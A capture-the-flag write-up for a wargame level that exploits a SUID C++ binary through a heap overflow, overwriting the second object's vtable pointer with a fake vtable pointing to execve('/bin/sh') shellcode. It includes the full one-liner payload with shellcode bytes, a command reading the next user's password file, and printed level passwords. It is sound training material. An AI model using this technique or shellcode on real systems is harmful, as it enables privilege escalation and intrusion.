# level9

## 1. Connect to the VM

The password for `level9`, obtained by solving `level8`, is:

```text
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

Connect with:

```bash
ssh level9@localhost -p 4242
```

## 2. Read the source

The equivalent C code obtained by decompiling the binary is available in
`source.cpp`.

The binary is owned by `bonus0` and has the SUID bit set. It therefore runs
with `bonus0` privileges.

The program creates two C++ objects of type `N`:

```c
first = new N(5);
second = new N(6);
```

Each object is `0x6c` bytes long:

```text
0x00      vtable pointer
0x04      annotation buffer
0x68      integer value
```

The first command-line argument is copied into the first object's annotation
buffer:

```c
memcpy(this->annotation, str, strlen(str));
```

There is no bounds check. Since `annotation` starts at `first + 4`, a long
argument overflows out of the first object and reaches the second object.

Finally, the program calls the first virtual method of the second object:

```c
second->vtable[0](second, first);
```

The objective is to overwrite `second->vtable` so this virtual call jumps to
our shellcode.

## 3. Understand the heap layout

ltrace ./level9 AAAA  
The two objects are allocated consecutively on the heap. With `ltrace`, the
allocation addresses are:

```text
_Znwj(108) = 0x0804a008
_Znwj(108) = 0x0804a078
```

The first object's annotation buffer starts 4 bytes after the beginning of the
object:

```text
first object:      0x0804a008
first annotation:  0x0804a00c
second object:     0x0804a078
```

The distance from `first->annotation` to `second->vtable` is:

```text
0x0804a078 - 0x0804a00c = 0x6c = 108 bytes
```

objdump -d -M intel ./level9  
The virtual call does two dereferences before jumping:

```asm
804867c: 8b 44 24 10    mov eax,DWORD PTR [esp+0x10]   ; eax = second
8048680: 8b 00          mov eax,DWORD PTR [eax]        ; eax = second->vtable
8048682: 8b 10          mov edx,DWORD PTR [eax]        ; edx = second->vtable[0]

8048684: 8b 44 24 14    mov eax,DWORD PTR [esp+0x14]   ; eax = first
8048688: 89 44 24 04    mov DWORD PTR [esp+0x4],eax    ; second argument = first
804868c: 8b 44 24 10    mov eax,DWORD PTR [esp+0x10]   ; eax = second
8048690: 89 04 24       mov DWORD PTR [esp],eax        ; first argument / this = second

8048693: ff d2          call edx                       ; call second->vtable[0](second, first)
```

if we simplify:
```asm
mov eax, [second]      ; eax = second->vtable
mov edx, [eax]         ; edx = second->vtable[0]
call edx
```

So we need a fake vtable. We can place it at the beginning of the annotation
buffer:

```text
0x0804a00c:  address of shellcode
0x0804a010:  shellcode
...
0x0804a078:  overwritten second->vtable = 0x0804a00c
```

## 4. Build the payload

Use `/bin/sh` shellcode and place it just after the fake vtable entry. This
shellcode clears `edx`, because `execve` expects its third argument, `envp`, to
be `NULL`:

```text
fake vtable[0] = 0x0804a010
shellcode      = 24 bytes
padding        = 108 - 4 - 24 = 80 bytes
second vtable  = 0x0804a00c
```

On a little-endian x86 machine, the addresses are written as:

```text
shellcode address  = \x10\xa0\x04\x08
fake vtable address = \x0c\xa0\x04\x08
```

## 5. Exploit the binary

Run:

```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 80 + "\x0c\xa0\x04\x08"')
```

The virtual call now follows the overwritten vtable pointer, reads the fake
function pointer, and executes the shellcode with `bonus0` privileges.

Then read the next password:

```bash
cat /home/user/bonus0/.pass
```

The output contains:

```text
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

This is the password stored in `flag` and can be used to connect as `bonus0`.
